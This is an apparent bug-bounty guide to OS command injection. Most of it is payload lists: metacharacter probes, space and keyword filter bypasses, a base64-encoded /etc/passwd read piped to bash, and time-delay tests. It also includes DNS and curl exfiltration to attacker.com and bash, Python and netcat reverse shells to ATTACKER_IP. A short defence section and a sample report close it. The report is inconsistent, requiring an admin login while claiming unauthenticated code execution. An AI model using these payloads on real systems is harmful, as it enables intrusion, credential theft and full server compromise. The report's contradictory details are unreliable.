# OS Command Injection

## When to Use
- When an application exposes functionality that typically relies on underlying OS binaries (e.g., `ping`, `nslookup`, `traceroute`, `ffmpeg`, `pdfgen`).
- When input parameters seem to be interacting directly with the filesystem or networked services (e.g., `?ip=127.0.0.1` or `?folder=/tmp`).
- To escalate blind or visible reflection bugs into complete, system-level Remote Code Execution (RCE).


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Injection Detection (Visible Response)

```text
# Concept: If the developer executes `ping -c 3 $USER_INPUT`, we can use shell 
# metacharacters to string together our own commands.

# Common Metacharacters:
;    (Command separator - Linux)
|    (Piping - Linux/Windows)
||   (OR operator - executes second if first fails)
&&   (AND operator - executes second if first succeeds)
`cmd` or $(cmd) (Command Substitution)
%0a  (Newline character / URL Encoded)

# 1. Basic Probing
# If the intended input is 127.0.0.1:
?ip=127.0.0.1;id
?ip=127.0.0.1|whoami
?ip=127.0.0.1||whoami
?ip=127.0.0.1%0awhoami
?ip=$(whoami)

# 2. Analyze Output
# If the response includes `uid=1000(www-data) gid=1000(www-data)`, it is definitively vulnerable to Command Injection.
```

### Phase 2: Bypassing Filters & Restrictions

```text
# Concept: WAFs or developers may try to filter spaces, slashes, or specific words (like `cat` or `flag`).

# 1. Bypassing Space Filters
# Use Input Field Separators (IFS), brace expansion, or redirection.
;cat<target.txt            # Redirection instead of space
;cat${IFS}target.txt       # Uses Internal Field Separator
;{cat,target.txt}          # Brace expansion

# 2. Bypassing Blacklisted Commands (e.g., 'cat' or 'whoami' blocked)
# Use quotes, slash injection, or wildcards to break up the word.
w'h'o'a'm'i
w"h"o"a"m"i
wh$@oami
/b?n/?at /e*c/pas*wd       # Wildcard execution targeting /bin/cat /etc/passwd

# 3. Encoding Bypasses
# Send commands encoded in Base64 and decode them on the fly.
;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

### Phase 3: Blind Command Injection (Time-Based)

```text
# Concept: The command executes on the server, but the web page does not display the output.

# 1. Time Delay Payloads
# Force the server to wait. If the page takes 10 seconds to load, you proved execution.
?ip=127.0.0.1;sleep 10
?ip=127.0.0.1|ping -c 10 127.0.0.1

# 2. Why it matters:
# Although you can't see the output, you can now infer data or initiate OOB exfiltration.
```

### Phase 4: Blind Command Injection (Out-Of-Band OOB)

```text
# Concept: Send the execution results to a server you control (like Burp Collaborator or a VPS)
# via DNS or HTTP requests.

# 1. DNS Exfiltration (Best for restricted egress networks)
# The server will resolve `whoami.attacker.com`, allowing you to see the username in DNS logs.
;nslookup `whoami`.attacker-controlled-domain.com

# 2. HTTP Exfiltration (Using curl/wget)
;curl http://attacker.com/log?data=$(cat /etc/passwd | base64 -w 0)

# 3. Upgrading to a Reverse Shell
# If you have RCE, establish a persistent connection back to your machine.
;bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

## 🔵 Blue Team Detection & Defense
- **Avoid OS Commands**: The best defense is to never call OS commands from application code. Use native programming language APIs instead (e.g., instead of calling `ping` in Bash, use a Ruby/Python socket library).
- **Strict Parameterization**: If calling OS processes is unavoidable, use secure APIs that do not invoke a shell wrapper. 
  - Python: Use `subprocess.run(["ping", "-c", "3", user_input])` rather than `os.system("ping " + user_input)` which spawns a vulnerable shell.
- **Input Sanitization**: Strictly whitelist input format (e.g., regex `^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$` for IP addresses).
- **EDR Monitoring**: Alert on web server processes (Apache/nginx/tomcat) spawning suspicious child processes (`/bin/sh`, `cmd.exe`, `curl`, `nc`).

## Key Concepts
| Concept | Description |
|---------|-------------|
| Command Injection | Exploiting an application that constructs a system shell command using untrusted user input |
| Shell Metacharacters | Characters like `;`, `|`, `&` that hold special meaning to the command line interpreter, allowing multiple commands to run |
| Blind RCE | Code execution where the output is not returned to the attacker's HTTP response, requiring indirect validation (time or out-of-band) |
| IFS | Internal Field Separator; a shell variable determining how strings are split. Extremely useful for bypassing space filters |

## Output Format
```
Bug Bounty Report: Command Injection in Diagnostic Tool
=======================================================
Vulnerability: OS Command Injection (Remote Code Execution)
Severity: Critical (CVSS 10.0)
Endpoint: POST /admin/network/ping

Description:
The "Ping Utility" feature passes the `target_ip` parameter directly into an unsanitized `os.system()` call on the backend server. By appending shell metacharacters, an attacker can execute arbitrary commands on the underlying Linux operating system.

Reproduction Steps:
1. Authenticate to the admin dashboard and navigate to the Ping Utility.
2. Submit the following payload in the IP field: `127.0.0.1; whoami`
3. The server response includes the output of the ping command, followed by `root`.
4. Submit reverse shell payload: `127.0.0.1; nc -e /bin/sh 10.0.0.5 4444`

Impact:
Critical. The attacker achieves unauthenticated Remote Code Execution running as `root`, leading to complete server compromise, database exfiltration, and lateral movement within the AWS VPC.
